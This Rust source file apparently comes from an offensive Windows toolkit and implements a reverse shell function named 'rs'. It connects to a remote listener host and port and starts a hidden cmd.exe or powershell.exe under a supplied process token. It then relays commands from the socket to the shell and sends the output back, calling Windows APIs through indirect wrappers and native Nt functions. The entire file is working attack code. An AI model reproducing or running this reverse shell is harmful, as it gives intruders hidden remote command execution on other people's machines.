use winapi::ctypes::c_void;

use std::{
    // ffi::c_void,
    ptr::{null, null_mut},
};

use crate::win32::{
    advapi32::advapi32,
    def::{
        CREATE_UNICODE_ENVIRONMENT, IoStatusBlock, ProcessBasicInformation, ProcessInformation,
        SecurityAttributes, StartupInfoW,
    },
    k32::k32,
    ntdll::ntdll,
    utils::nt_create_named_pipe_file,
    winsock::{FD_SET, FIONBIO, TIMEVAL, connect_socket, create_socket, init_winsock, winsock},
};

/// Executes a reverse shell by connecting to a remote server and launching a specified process
/// (e.g., `cmd.exe` or `powershell.exe`) with redirected I/O using the provided process token.
///
/// # Arguments
/// - `h`: The **listener host** (IP address or hostname) of the remote server to connect to.
/// - `p`: The **listener port** on the remote server to establish the connection.
/// - `c`: The **command shell** to execute after establishing the connection (e.g., "cmd.exe" or "powershell.exe").
/// - `htoken`: A **process token** (`HANDLE`) used to create the reverse shell process with the appropriate privileges.
///
/// # Returns
/// - `true` if the reverse shell is successfully established and the process is launched.
/// - `false` if the operation fails at any step (e.g., socket creation, connection, or process execution).
pub fn rs(h: &str, p: u16, c: &str, htoken: *mut winapi::ctypes::c_void) -> bool {
    init_winsock(); // Initialize Winsock library for network communication
    let sock = create_socket(); // Create a TCP socket

    // Check if the socket creation was successful
    if sock == !0 {
        return false;
    }

    // Attempt to connect the socket to the provided URL and lport
    let connect_result = connect_socket(sock, h, p);
    if connect_result != 0 {
        unsafe {
            (winsock().closesocket)(sock);
            (winsock().wsa_cleanup)();
        }
        return false;
    }

    // Constants for the startup flags (used to specify the creation behavior of the process)
    const STARTF_USESTDHANDLES: u32 = 0x00000100;
    const CREATE_NO_WINDOW: u32 = 0x08000000;

    let mut stdin_read: *mut c_void = null_mut(); // Pipe for reading from stdin
    let mut stdin_write: *mut c_void = null_mut(); // Pipe for writing to stdin
    let mut stdout_read: *mut c_void = null_mut(); // Pipe for reading from stdout
    let mut stdout_write: *mut c_void = null_mut(); // Pipe for writing to stdout

    // Security attributes for pipe creation (allows handle inheritance)
    let mut security_attributes = SecurityAttributes {
        n_length: core::mem::size_of::<SecurityAttributes>() as u32,
        lp_security_descriptor: null_mut(),
        b_inherit_handle: true,
    };

    unsafe {
        // Set the socket to non-blocking mode
        let mut nonblocking: u32 = 1;
        let ioctl_result = (winsock().ioctlsocket)(sock, FIONBIO, &mut nonblocking);
        if ioctl_result != 0 {
            (winsock().closesocket)(sock);
            (winsock().wsa_cleanup)();
            return false;
        }

        // Create a named pipe for communication between processes.
        let status = nt_create_named_pipe_file(
            &mut stdin_read,
            &mut stdin_write,
            &mut security_attributes,
            0, // Use the default buffer size of 4096 bytes.
            1,
        );

        if status != 0 {
            (winsock().closesocket)(sock);
            (winsock().wsa_cleanup)();
            return false;
        }

        let status = nt_create_named_pipe_file(
            &mut stdout_read,
            &mut stdout_write,
            &mut security_attributes,
            0, // Use the default buffer size of 4096 bytes.
            2,
        );

        if status != 0 {
            ntdll().nt_close.run(stdin_read);
            ntdll().nt_close.run(stdin_write);
            (winsock().closesocket)(sock);
            (winsock().wsa_cleanup)();
            return false;
        }

        // Setup process startup info (redirect standard handles)
        let mut startup_info: StartupInfoW = StartupInfoW::new();
        startup_info.cb = core::mem::size_of::<StartupInfoW>() as u32;
        startup_info.dw_flags = STARTF_USESTDHANDLES;
        startup_info.h_std_input = stdin_read;
        startup_info.h_std_output = stdout_write;
        startup_info.h_std_error = stdout_write;

        // Create process information struct
        let mut process_info: ProcessInformation = ProcessInformation::new();
        let mut cmdline_utf16: Vec<u16> = c.encode_utf16().chain(Some(0)).collect();

        let success = (advapi32().create_process_with_token_w)(
            htoken,
            0,
            null(),
            cmdline_utf16.as_mut_ptr(),
            CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
            null_mut(),
            null(),
            &mut startup_info,
            &mut process_info,
        ) != 0;

        if !success {
            ntdll().nt_close.run(stdin_read);
            ntdll().nt_close.run(stdin_write);
            ntdll().nt_close.run(stdout_read);
            ntdll().nt_close.run(stdout_write);
            (winsock().closesocket)(sock);
            (winsock().wsa_cleanup)();
            return false;
        }

        // Close the read/write handles for the child process
        ntdll().nt_close.run(stdin_read);
        ntdll().nt_close.run(stdout_write);

        let mut buffer = [0u8; 4096];

        // Main loop to handle communication between the remote server and the local process
        loop {
            let mut process_basic_info: ProcessBasicInformation = core::mem::zeroed();
            let mut return_length: u32 = 0;

            let status = ntdll().nt_query_information_process.run(
                process_info.h_process,
                0, // ProcessBasicInformation
                &mut process_basic_info as *mut _ as *mut c_void,
                core::mem::size_of::<ProcessBasicInformation>() as u32,
                &mut return_length,
            );

            if status != 0 || process_basic_info.exit_status != 259 {
                break; // Exit the loop if the process has exited or the query failed
            }

            // Prepare to use `select` to monitor socket activity
            let mut fd_array = [0usize; 64];
            fd_array[0] = sock;
            let mut read_fds = FD_SET {
                fd_count: 1,
                fd_array,
            };

            let mut timeout = TIMEVAL {
                tv_sec: 0,
                tv_usec: 10000,
            };

            // Monitor the socket for incoming data
            let select_result = (winsock().select)(
                0,
                &mut read_fds as *mut FD_SET,
                null_mut(),
                null_mut(),
                &mut timeout as *mut TIMEVAL,
            );

            if select_result == -1 {
                let error_code = (winsock().wsa_get_last_error)();

                // Exit the loop on unhandled errors
                if error_code != 10035 {
                    break;
                }
            }

            // If there is data to read from the socket
            if select_result > 0 {
                let bytes_received =
                    (winsock().recv)(sock, buffer.as_mut_ptr() as *mut i8, buffer.len() as i32, 0);

                if bytes_received > 0 {
                    let mut bytes_written = 0;

                    // Write the received data to the stdin pipe of the child process
                    while bytes_written < bytes_received as u32 {
                        let mut io_status_block: IoStatusBlock = IoStatusBlock::new();

                        let status = ntdll().nt_write_file.run(
                            stdin_write,
                            null_mut(),
                            null_mut(),
                            null_mut(),
                            &mut io_status_block,
                            buffer.as_ptr().add(bytes_written as usize) as *mut c_void,
                            bytes_received as u32 - bytes_written,
                            null_mut(),
                            null_mut(),
                        );

                        if status != 0 {
                            break;
                        }

                        bytes_written += io_status_block.information;
                    }
                }
            }

            // Read from the child process's stdout pipe
            let mut bytes_available: u32 = 0;
            let peek_result = (k32().peek_named_pipe)(
                stdout_read,
                null_mut(),
                0,
                null_mut(),
                &mut bytes_available,
                null_mut(),
            );

            if peek_result != 0 && bytes_available > 0 {
                let mut io_status_block_read: IoStatusBlock = IoStatusBlock::new();

                let read_result = ntdll().nt_read_file.run(
                    stdout_read,
                    null_mut(),
                    null_mut(),
                    null_mut(),
                    &mut io_status_block_read,
                    buffer.as_mut_ptr() as *mut c_void,
                    buffer.len() as u32,
                    null_mut(),
                    null_mut(),
                );

                if read_result == 0 && io_status_block_read.information > 0 {
                    let mut total_sent = 0;

                    // Send the stdout data back to the remote server
                    while total_sent < io_status_block_read.information {
                        let sent = (winsock().send)(
                            sock,
                            buffer.as_ptr().add(total_sent as usize) as *const i8,
                            (io_status_block_read.information - total_sent) as i32,
                            0,
                        );
                        if sent == -1 {
                            break;
                        }
                        total_sent += sent as u32;
                    }
                }
            }
        }

        ntdll().nt_close.run(stdin_write);
        ntdll().nt_close.run(stdout_read);
        ntdll().nt_close.run(process_info.h_process);
        ntdll().nt_close.run(process_info.h_thread);

        (winsock().closesocket)(sock);
        (winsock().wsa_cleanup)();
    }

    true
}
